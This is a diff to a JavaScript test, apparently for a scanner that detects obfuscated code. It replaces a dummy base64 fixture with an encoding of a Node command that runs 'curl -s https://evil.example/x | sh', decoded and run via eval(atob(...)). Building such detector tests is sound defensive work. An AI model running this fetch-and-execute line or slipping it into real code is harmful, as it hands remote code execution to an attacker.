@@ -132,7 +132,8 @@ console.log(x);
   });
 
   it('fails with long base64 string and atob', async () => {
-    const longBase64 = 'A'.repeat(80);
+    // a real encoding (one-case runs like 'AAAA…' are ordinary data)
+    const longBase64 = Buffer.from('require("child_process").exec("curl -s https://evil.example/x | sh")').toString('base64');
     await writeFile(join(tempDir, 'obf.js'), `
 const payload = "${longBase64}";
 eval(atob(payload));
